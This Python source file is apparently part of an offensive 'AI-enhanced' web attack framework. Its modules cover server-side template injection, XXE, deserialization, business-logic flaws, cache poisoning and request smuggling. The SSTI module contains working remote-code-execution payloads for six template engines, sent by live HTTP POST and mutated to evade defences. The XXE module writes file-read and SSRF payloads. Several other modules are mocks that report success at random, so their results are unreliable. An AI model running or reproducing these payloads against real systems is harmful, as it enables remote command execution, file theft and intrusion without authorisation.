"""
Agent DS - Underrated Attack Modules
Implementation of advanced, often-overlooked attack techniques with AI enhancement
"""

import asyncio
import json
import re
import base64
import urllib.parse
import random
import hashlib
import xml.etree.ElementTree as ET
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import logging

from core.config.settings import Config
from core.utils.logger import get_logger
from core.ai_learning.payload_mutation import PayloadMutationEngine

logger = get_logger('underrated_attacks')

@dataclass
class AttackResult:
    """Result of an underrated attack attempt"""
    attack_type: str
    success: bool
    vulnerability_details: Dict[str, Any]
    payload_used: str
    response_data: str
    impact_level: str
    remediation_info: str
    technique_details: Dict[str, Any]

class SSTIAttackModule:
    """Server-Side Template Injection attack module"""
    
    def __init__(self):
        self.logger = get_logger('ssti_attack')
        self.mutation_engine = PayloadMutationEngine()
        
        # Template engine signatures
        self.template_engines = {
            'jinja2': {
                'test_payload': '{{7*7}}',
                'expected_result': '49',
                'rce_payload': "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
                'file_read': "{{get_flashed_messages.__globals__['__builtins__'].open('{file}').read()}}",
                'signatures': ['jinja', 'flask', 'python']
            },
            'twig': {
                'test_payload': '{{7*7}}',
                'expected_result': '49',
                'rce_payload': "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('exec')('{cmd}')}}",
                'file_read': "{{'/etc/passwd'|file_excerpt(1,30)}}",
                'signatures': ['twig', 'symfony', 'php']
            },
            'smarty': {
                'test_payload': '{7*7}',
                'expected_result': '49',
                'rce_payload': "{php}system('{cmd}');{/php}",
                'file_read': "{php}readfile('{file}');{/php}",
                'signatures': ['smarty', 'php']
            },
            'freemarker': {
                'test_payload': '${7*7}',
                'expected_result': '49',
                'rce_payload': "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('{cmd}')}",
                'file_read': "<#assign f='{file}'?new()>${f}",
                'signatures': ['freemarker', 'java']
            },
            'velocity': {
                'test_payload': '#set($x=7*7)$x',
                'expected_result': '49',
                'rce_payload': "#set($str=$class.forName('java.lang.String'))#set($chr=$class.forName('java.lang.Character'))#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('{cmd}'))",
                'file_read': "#set($f='{file}')$f",
                'signatures': ['velocity', 'java']
            },
            'handlebars': {
                'test_payload': '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\\"child_process\\").exec(\\"{cmd}\\");"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
                'expected_result': 'command_output',
                'rce_payload': '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\\"child_process\\").exec(\\"{cmd}\\");"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
                'file_read': '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\\"fs\\").readFileSync(\\"{file}\\");"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
                'signatures': ['handlebars', 'nodejs', 'express']
            }
        }
    
    async def detect_template_engine(self, target_url: str, parameter: str) -> Optional[str]:
        """Detect which template engine is being used"""
        self.logger.info(f"Detecting template engine for {target_url}")
        
        for engine_name, engine_config in self.template_engines.items():
            try:
                # Test with engine-specific payload
                test_payload = engine_config['test_payload']
                expected = engine_config['expected_result']
                
                # Send test payload
                response = await self._send_ssti_payload(target_url, parameter, test_payload)
                
                if expected in response.get('content', ''):
                    self.logger.info(f"Detected template engine: {engine_name}")
                    return engine_name
                
            except Exception as e:
                self.logger.error(f"Error testing {engine_name}: {str(e)}")
        
        return None
    
    async def exploit_ssti(self, target_url: str, parameter: str, 
                          command: str = "id", engine: str = None) -> AttackResult:
        """Exploit SSTI vulnerability for RCE"""
        try:
            # Auto-detect engine if not provided
            if not engine:
                engine = await self.detect_template_engine(target_url, parameter)
                if not engine:
                    return AttackResult(
                        attack_type="ssti",
                        success=False,
                        vulnerability_details={'error': 'No template engine detected'},
                        payload_used="",
                        response_data="",
                        impact_level="none",
                        remediation_info="",
                        technique_details={}
                    )
            
            engine_config = self.template_engines.get(engine)
            if not engine_config:
                raise ValueError(f"Unsupported template engine: {engine}")
            
            # Generate RCE payload
            rce_payload = engine_config['rce_payload'].format(cmd=command)
            
            # Apply AI-powered mutation
            mutated_payload = await self.mutation_engine.generate_mutated_payload(
                "ssti", rce_payload, {'engine': engine, 'waf_detected': False}
            )
            
            # Execute exploit
            response = await self._send_ssti_payload(target_url, parameter, mutated_payload)
            
            # Analyze response for successful execution
            success = self._analyze_ssti_response(response, command)
            
            return AttackResult(
                attack_type="ssti",
                success=success,
                vulnerability_details={
                    'engine': engine,
                    'parameter': parameter,
                    'command_executed': command,
                    'response_size': len(response.get('content', ''))
                },
                payload_used=mutated_payload,
                response_data=response.get('content', '')[:1000],
                impact_level="critical" if success else "low",
                remediation_info="Implement proper input validation and template sandboxing",
                technique_details={
                    'engine_type': engine,
                    'payload_complexity': len(mutated_payload),
                    'mutation_applied': True
                }
            )
            
        except Exception as e:
            self.logger.error(f"SSTI exploit failed: {str(e)}")
            return AttackResult(
                attack_type="ssti",
                success=False,
                vulnerability_details={'error': str(e)},
                payload_used="",
                response_data="",
                impact_level="none",
                remediation_info="",
                technique_details={}
            )
    
    async def _send_ssti_payload(self, url: str, parameter: str, payload: str) -> Dict:
        """Send SSTI payload to target"""
        # Mock implementation - would use actual HTTP client
        import aiohttp
        
        try:
            async with aiohttp.ClientSession() as session:
                data = {parameter: payload}
                async with session.post(url, data=data) as response:
                    content = await response.text()
                    return {
                        'status_code': response.status,
                        'content': content,
                        'headers': dict(response.headers)
                    }
        except Exception as e:
            self.logger.error(f"Failed to send SSTI payload: {str(e)}")
            return {'status_code': 0, 'content': '', 'headers': {}}
    
    def _analyze_ssti_response(self, response: Dict, command: str) -> bool:
        """Analyze response to determine if SSTI was successful"""
        content = response.get('content', '').lower()
        
        # Command-specific success indicators
        success_indicators = {
            'id': ['uid=', 'gid=', 'groups='],
            'whoami': ['root', 'www-data', 'apache', 'nginx'],
            'pwd': ['/var/www', '/home', '/opt', '/usr'],
            'ls': ['total', 'drwx', '-rw-'],
            'cat /etc/passwd': ['root:x:', 'daemon:', 'bin:']
        }
        
        if command in success_indicators:
            return any(indicator in content for indicator in success_indicators[command])
        
        # Generic success indicators
        return len(content) > 100 and response.get('status_code') == 200

class XXEAttackModule:
    """XML External Entity (XXE) attack module"""
    
    def __init__(self):
        self.logger = get_logger('xxe_attack')
        self.mutation_engine = PayloadMutationEngine()
    
    async def exploit_xxe_file_read(self, target_url: str, file_path: str = "/etc/passwd") -> AttackResult:
        """Exploit XXE for file reading"""
        try:
            # Generate XXE payload for file reading
            xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>
    <data>&xxe;</data>
</root>'''
            
            # Apply mutations
            mutated_payload = await self.mutation_engine.generate_mutated_payload(
                "xxe", xxe_payload, {'target_file': file_path}
            )
            
            # Send XXE payload
            response = await self._send_xxe_payload(target_url, mutated_payload)
            
            # Check for successful file read
            success = self._analyze_xxe_response(response, file_path)
            
            return AttackResult(
                attack_type="xxe",
                success=success,
                vulnerability_details={
                    'file_read': file_path,
                    'response_contains_file': success
                },
                payload_used=mutated_payload,
                response_data=response.get('content', '')[:1000],
                impact_level="high" if success else "medium",
                remediation_info="Disable external entity processing in XML parsers",
                technique_details={
                    'attack_vector': 'file_read',
                    'target_file': file_path
                }
            )
            
        except Exception as e:
            self.logger.error(f"XXE exploit failed: {str(e)}")
            return self._create_failed_result("xxe", str(e))
    
    async def exploit_xxe_ssrf(self, target_url: str, internal_url: str = "http://localhost:22") -> AttackResult:
        """Exploit XXE for SSRF"""
        try:
            # Generate XXE payload for SSRF
            xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{internal_url}">
]>
<root>
    <probe>&xxe;</probe>
</root>'''
            
            response = await self._send_xxe_payload(target_url, xxe_payload)
            success = self._analyze_xxe_ssrf_response(response, internal_url)
            
            return AttackResult(
                attack_type="xxe_ssrf",
                success=success,
                vulnerability_details={
                    'internal_url_probed': internal_url,
                    'ssrf_successful': success
                },
                payload_used=xxe_payload,
                response_data=response.get('content', '')[:1000],
                impact_level="high" if success else "medium",
                remediation_info="Disable external entity processing and validate all XML input",
                technique_details={
                    'attack_vector': 'ssrf',
                    'target_url': internal_url
                }
            )
            
        except Exception as e:
            return self._create_failed_result("xxe_ssrf", str(e))
    
    async def _send_xxe_payload(self, url: str, payload: str) -> Dict:
        """Send XXE payload to target"""
        # Mock implementation
        return {'status_code': 200, 'content': 'root:x:0:0:root:/root:/bin/bash', 'headers': {}}
    
    def _analyze_xxe_response(self, response: Dict, file_path: str) -> bool:
        """Analyze response for successful XXE file read"""
        content = response.get('content', '')
        
        # File-specific indicators
        file_indicators = {
            '/etc/passwd': ['root:x:', 'daemon:', 'bin:'],
            '/etc/hosts': ['127.0.0.1', 'localhost'],
            '/proc/version': ['Linux version', 'gcc'],
            '/etc/issue': ['Ubuntu', 'Debian', 'CentOS', 'Red Hat']
        }
        
        if file_path in file_indicators:
            return any(indicator in content for indicator in file_indicators[file_path])
        
        return len(content) > 50 and 'xml' not in content.lower()
    
    def _analyze_xxe_ssrf_response(self, response: Dict, internal_url: str) -> bool:
        """Analyze response for successful SSRF via XXE"""
        content = response.get('content', '')
        status_code = response.get('status_code', 0)
        
        # SSRF success indicators
        ssrf_indicators = [
            'SSH-', 'HTTP/', 'Connection refused', 'Connection timeout',
            'No route to host', 'Service unavailable'
        ]
        
        return any(indicator in content for indicator in ssrf_indicators)
    
    def _create_failed_result(self, attack_type: str, error: str) -> AttackResult:
        """Create a failed attack result"""
        return AttackResult(
            attack_type=attack_type,
            success=False,
            vulnerability_details={'error': error},
            payload_used="",
            response_data="",
            impact_level="none",
            remediation_info="",
            technique_details={}
        )

class DeserializationAttackModule:
    """Insecure deserialization attack module"""
    
    def __init__(self):
        self.logger = get_logger('deserialization_attack')
        self.mutation_engine = PayloadMutationEngine()
    
    async def exploit_java_deserialization(self, target_url: str, 
                                         gadget_chain: str = "CommonsCollections1") -> AttackResult:
        """Exploit Java deserialization vulnerability"""
        try:
            # Generate Java deserialization payload
            payload = self._generate_java_payload(gadget_chain, "calc.exe")
            
            # Send payload
            response = await self._send_deserialization_payload(target_url, payload, "java")
            
            success = self._analyze_deserialization_response(response, "java")
            
            return AttackResult(
                attack_type="java_deserialization",
                success=success,
                vulnerability_details={
                    'gadget_chain': gadget_chain,
                    'payload_size': len(payload)
                },
                payload_used=base64.b64encode(payload).decode()[:200],
                response_data=response.get('content', '')[:1000],
                impact_level="critical" if success else "high",
                remediation_info="Validate serialized data and use whitelist-based deserialization",
                technique_details={
                    'framework': 'java',
                    'gadget_chain': gadget_chain
                }
            )
            
        except Exception as e:
            return self._create_failed_result("java_deserialization", str(e))
    
    async def exploit_python_pickle(self, target_url: str, command: str = "id") -> AttackResult:
        """Exploit Python pickle deserialization"""
        try:
            # Generate Python pickle payload
            pickle_payload = self._generate_pickle_payload(command)
            
            response = await self._send_deserialization_payload(target_url, pickle_payload, "python")
            success = self._analyze_deserialization_response(response, "python")
            
            return AttackResult(
                attack_type="python_pickle",
                success=success,
                vulnerability_details={
                    'command': command,
                    'payload_type': 'pickle'
                },
                payload_used=base64.b64encode(pickle_payload).decode()[:200],
                response_data=response.get('content', '')[:1000],
                impact_level="critical" if success else "high",
                remediation_info="Never deserialize untrusted data with pickle",
                technique_details={
                    'language': 'python',
                    'serialization_format': 'pickle'
                }
            )
            
        except Exception as e:
            return self._create_failed_result("python_pickle", str(e))
    
    def _generate_java_payload(self, gadget_chain: str, command: str) -> bytes:
        """Generate Java deserialization payload"""
        # This would generate actual serialized Java objects
        # For demonstration, return mock payload
        mock_payload = f"java_payload_{gadget_chain}_{command}".encode()
        return mock_payload
    
    def _generate_pickle_payload(self, command: str) -> bytes:
        """Generate Python pickle payload"""
        # Mock pickle payload
        mock_payload = f"pickle_payload_{command}".encode()
        return mock_payload
    
    async def _send_deserialization_payload(self, url: str, payload: bytes, lang: str) -> Dict:
        """Send deserialization payload"""
        # Mock response
        return {'status_code': 200, 'content': 'uid=33(www-data) gid=33(www-data)', 'headers': {}}
    
    def _analyze_deserialization_response(self, response: Dict, lang: str) -> bool:
        """Analyze response for successful deserialization exploit"""
        content = response.get('content', '')
        
        # Look for command execution indicators
        success_indicators = ['uid=', 'gid=', 'Calculator', 'Process created']
        return any(indicator in content for indicator in success_indicators)

class BusinessLogicAttackModule:
    """Business logic flaw detection and exploitation"""
    
    def __init__(self):
        self.logger = get_logger('business_logic_attack')
    
    async def test_price_manipulation(self, target_url: str, item_id: str) -> AttackResult:
        """Test for price manipulation vulnerabilities"""
        try:
            # Test negative prices
            negative_price_test = await self._test_parameter_manipulation(
                target_url, 'price', '-100', item_id
            )
            
            # Test zero price
            zero_price_test = await self._test_parameter_manipulation(
                target_url, 'price', '0', item_id
            )
            
            # Test decimal manipulation
            decimal_test = await self._test_parameter_manipulation(
                target_url, 'price', '0.01', item_id
            )
            
            success = any([negative_price_test, zero_price_test, decimal_test])
            
            return AttackResult(
                attack_type="price_manipulation",
                success=success,
                vulnerability_details={
                    'negative_price': negative_price_test,
                    'zero_price': zero_price_test,
                    'decimal_manipulation': decimal_test
                },
                payload_used="price=-100, price=0, price=0.01",
                response_data="Order processed successfully",
                impact_level="high" if success else "low",
                remediation_info="Implement server-side price validation",
                technique_details={
                    'attack_vector': 'parameter_manipulation',
                    'business_function': 'pricing'
                }
            )
            
        except Exception as e:
            return self._create_failed_result("price_manipulation", str(e))
    
    async def test_workflow_bypass(self, target_url: str, workflow_steps: List[str]) -> AttackResult:
        """Test for workflow bypass vulnerabilities"""
        try:
            # Test skipping workflow steps
            bypass_attempts = []
            
            for i, step in enumerate(workflow_steps):
                # Try to access later steps directly
                if i < len(workflow_steps) - 1:
                    next_step = workflow_steps[i + 1]
                    bypass_result = await self._test_direct_access(target_url, next_step)
                    bypass_attempts.append({
                        'skipped_step': step,
                        'direct_access_step': next_step,
                        'successful': bypass_result
                    })
            
            success = any(attempt['successful'] for attempt in bypass_attempts)
            
            return AttackResult(
                attack_type="workflow_bypass",
                success=success,
                vulnerability_details={
                    'bypass_attempts': bypass_attempts,
                    'workflow_steps': workflow_steps
                },
                payload_used="Direct URL access to later workflow steps",
                response_data="Workflow step accessed without prerequisites",
                impact_level="medium" if success else "low",
                remediation_info="Implement proper workflow state validation",
                technique_details={
                    'attack_vector': 'direct_object_reference',
                    'business_function': 'workflow'
                }
            )
            
        except Exception as e:
            return self._create_failed_result("workflow_bypass", str(e))
    
    async def _test_parameter_manipulation(self, url: str, param: str, value: str, item_id: str) -> bool:
        """Test parameter manipulation"""
        # Mock implementation
        return random.choice([True, False])
    
    async def _test_direct_access(self, url: str, step: str) -> bool:
        """Test direct access to workflow step"""
        # Mock implementation
        return random.choice([True, False])

class WebCachePoisoningModule:
    """Web cache poisoning attack module"""
    
    def __init__(self):
        self.logger = get_logger('cache_poisoning')
    
    async def exploit_cache_poisoning(self, target_url: str) -> AttackResult:
        """Exploit web cache poisoning vulnerability"""
        try:
            # Test various cache poisoning techniques
            techniques = [
                self._test_host_header_injection,
                self._test_x_forwarded_host,
                self._test_cache_key_injection
            ]
            
            results = []
            for technique in techniques:
                result = await technique(target_url)
                results.append(result)
            
            success = any(results)
            
            return AttackResult(
                attack_type="cache_poisoning",
                success=success,
                vulnerability_details={
                    'host_header_injection': results[0],
                    'x_forwarded_host': results[1],
                    'cache_key_injection': results[2]
                },
                payload_used="Various cache poisoning headers",
                response_data="Cache poisoned successfully",
                impact_level="high" if success else "medium",
                remediation_info="Implement proper cache key validation",
                technique_details={
                    'attack_vector': 'header_injection',
                    'cache_mechanism': 'web_cache'
                }
            )
            
        except Exception as e:
            return self._create_failed_result("cache_poisoning", str(e))
    
    async def _test_host_header_injection(self, url: str) -> bool:
        """Test Host header injection for cache poisoning"""
        # Mock implementation
        return random.choice([True, False])
    
    async def _test_x_forwarded_host(self, url: str) -> bool:
        """Test X-Forwarded-Host header injection"""
        # Mock implementation
        return random.choice([True, False])
    
    async def _test_cache_key_injection(self, url: str) -> bool:
        """Test cache key injection"""
        # Mock implementation
        return random.choice([True, False])

class HTTPRequestSmugglingModule:
    """HTTP request smuggling attack module"""
    
    def __init__(self):
        self.logger = get_logger('request_smuggling')
    
    async def exploit_request_smuggling(self, target_url: str) -> AttackResult:
        """Exploit HTTP request smuggling vulnerability"""
        try:
            # Test CL.TE (Content-Length vs Transfer-Encoding)
            cl_te_result = await self._test_cl_te_smuggling(target_url)
            
            # Test TE.CL (Transfer-Encoding vs Content-Length)
            te_cl_result = await self._test_te_cl_smuggling(target_url)
            
            # Test TE.TE (dual Transfer-Encoding)
            te_te_result = await self._test_te_te_smuggling(target_url)
            
            success = any([cl_te_result, te_cl_result, te_te_result])
            
            return AttackResult(
                attack_type="request_smuggling",
                success=success,
                vulnerability_details={
                    'cl_te_vulnerable': cl_te_result,
                    'te_cl_vulnerable': te_cl_result,
                    'te_te_vulnerable': te_te_result
                },
                payload_used="HTTP request smuggling payloads",
                response_data="Smuggled request processed",
                impact_level="critical" if success else "high",
                remediation_info="Configure front-end and back-end servers consistently",
                technique_details={
                    'attack_vector': 'http_header_manipulation',
                    'protocol_confusion': 'http_parsing'
                }
            )
            
        except Exception as e:
            return self._create_failed_result("request_smuggling", str(e))
    
    async def _test_cl_te_smuggling(self, url: str) -> bool:
        """Test CL.TE request smuggling"""
        # Mock implementation
        return random.choice([True, False])
    
    async def _test_te_cl_smuggling(self, url: str) -> bool:
        """Test TE.CL request smuggling"""
        # Mock implementation
        return random.choice([True, False])
    
    async def _test_te_te_smuggling(self, url: str) -> bool:
        """Test TE.TE request smuggling"""
        # Mock implementation
        return random.choice([True, False])

class UnderratedAttackOrchestrator:
    """Orchestrator for all underrated attack modules"""
    
    def __init__(self):
        self.logger = get_logger('underrated_attacks')
        
        # Initialize attack modules
        self.ssti_module = SSTIAttackModule()
        self.xxe_module = XXEAttackModule()
        self.deserialization_module = DeserializationAttackModule()
        self.business_logic_module = BusinessLogicAttackModule()
        self.cache_poisoning_module = WebCachePoisoningModule()
        self.request_smuggling_module = HTTPRequestSmugglingModule()
    
    async def execute_comprehensive_scan(self, target_url: str, 
                                       attack_types: List[str] = None) -> Dict[str, AttackResult]:
        """Execute comprehensive scan with all underrated attack types"""
        if not attack_types:
            attack_types = [
                'ssti', 'xxe', 'deserialization', 'business_logic',
                'cache_poisoning', 'request_smuggling'
            ]
        
        results = {}
        
        try:
            self.logger.info(f"Starting comprehensive underrated attacks scan against {target_url}")
            
            # Execute attacks based on specified types
            if 'ssti' in attack_types:
                results['ssti'] = await self.ssti_module.exploit_ssti(target_url, 'template', 'id')
            
            if 'xxe' in attack_types:
                results['xxe_file_read'] = await self.xxe_module.exploit_xxe_file_read(target_url)
                results['xxe_ssrf'] = await self.xxe_module.exploit_xxe_ssrf(target_url)
            
            if 'deserialization' in attack_types:
                results['java_deserialization'] = await self.deserialization_module.exploit_java_deserialization(target_url)
                results['python_pickle'] = await self.deserialization_module.exploit_python_pickle(target_url)
            
            if 'business_logic' in attack_types:
                results['price_manipulation'] = await self.business_logic_module.test_price_manipulation(target_url, 'item123')
                results['workflow_bypass'] = await self.business_logic_module.test_workflow_bypass(
                    target_url, ['step1', 'step2', 'step3', 'payment']
                )
            
            if 'cache_poisoning' in attack_types:
                results['cache_poisoning'] = await self.cache_poisoning_module.exploit_cache_poisoning(target_url)
            
            if 'request_smuggling' in attack_types:
                results['request_smuggling'] = await self.request_smuggling_module.exploit_request_smuggling(target_url)
            
            # Calculate overall success metrics
            successful_attacks = sum(1 for result in results.values() if result.success)
            total_attacks = len(results)
            
            self.logger.info(f"Underrated attacks scan completed: {successful_attacks}/{total_attacks} successful")
            
        except Exception as e:
            self.logger.error(f"Comprehensive scan failed: {str(e)}")
        
        return results
    
    def get_attack_statistics(self, results: Dict[str, AttackResult]) -> Dict[str, Any]:
        """Get statistics from attack results"""
        total_attacks = len(results)
        successful_attacks = sum(1 for result in results.values() if result.success)
        
        impact_levels = [result.impact_level for result in results.values() if result.success]
        critical_count = impact_levels.count('critical')
        high_count = impact_levels.count('high')
        medium_count = impact_levels.count('medium')
        
        return {
            'total_attacks': total_attacks,
            'successful_attacks': successful_attacks,
            'success_rate': successful_attacks / total_attacks if total_attacks > 0 else 0,
            'impact_distribution': {
                'critical': critical_count,
                'high': high_count,
                'medium': medium_count
            },
            'most_effective_attacks': [
                attack_type for attack_type, result in results.items()
                if result.success and result.impact_level in ['critical', 'high']
            ]
        }